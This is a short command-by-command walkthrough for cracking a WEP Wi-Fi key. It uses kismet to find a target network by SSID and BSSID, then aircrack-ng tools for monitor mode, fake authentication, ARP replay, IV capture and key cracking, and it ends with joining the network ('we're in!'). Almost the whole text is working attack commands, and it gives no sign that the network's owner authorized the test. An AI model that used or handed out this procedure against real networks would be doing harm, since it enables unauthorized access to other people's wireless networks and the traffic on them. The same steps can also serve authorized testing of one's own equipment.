what we need:
	aircrack-ng
	kismet

get root permissions
$ sudo -i

open up 3 terminals

get wireless card MAC address
$ ifconfig wlan1
mac=00:C0:CA:40:B1:B8

check for wireless network(s)
$ kismet

h = help
x = close popup window
s = sort
s = SSID
scroll to actt
i = detailed information

essid=actt
bssid=00:25:9C:41:31:DE
chan=6

x = close popup window
Q = quit
sometimes you also need ctrl+c

start wireless in monitor mode
$ airmon-ng start wlan1 $chan

note that it started mon0 (monitor mode enabled)

test if we can inject packets to the access point
$ aireplay-ng -9 -e $essid -a $bssid mon0

start capturing initialization vectors
$ airodump-ng -c $chan --bssid $bssid -w output mon0

in another terminal do a fake authentication with the AP
$ aireplay-ng -1 0 -e $essid -a $bssid -h $mac mon0

start relaying ARP requests
$ aireplay-ng -3 -b $bssid -h $mac mon0
nothing is currently relayed because nothing is on the network

in another terminal generate ARP requests by pinging an invalid IP address
(make sure you are connected via Ethernet or another wireless NIC)
(actually, simply connecting to the network via Ethernet will generate an ARP request)
$ ping 192.168.1.222

check other terminals to see if you are relaying ARP packets and capturing them

in another terminal start cracking
$ aircrack-ng -b $bssid output*.cap

wait for the key to be cracked

key=

once done stop all relaying, capturing and pinging
stop wireless monitor mode
$ airmon-ng stop wlan1
$ airmon-ng stop mon0

connect to the wireless network normally with the cracked key
we're in!
